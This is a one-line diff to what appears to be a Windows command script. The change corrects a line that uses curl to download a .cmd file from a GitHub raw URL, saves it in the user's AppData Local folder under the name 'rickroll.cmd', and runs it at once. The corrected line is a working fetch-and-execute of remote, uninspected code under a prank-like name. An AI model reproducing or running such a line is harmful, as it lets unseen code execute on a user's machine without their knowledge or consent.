@@ -1,1 +1,1 @@
-curl https://raw.githubusercontent.com/Paopun20/secret-cmd/main/main.cmd > cd %AppData%/../Local/rickroll.cmd && cd %AppData%/../Local/rickroll.cmd
+curl https://raw.githubusercontent.com/Paopun20/secret-cmd/main/main.cmd > %AppData%/../Local/rickroll.cmd && %AppData%/../Local/rickroll.cmd
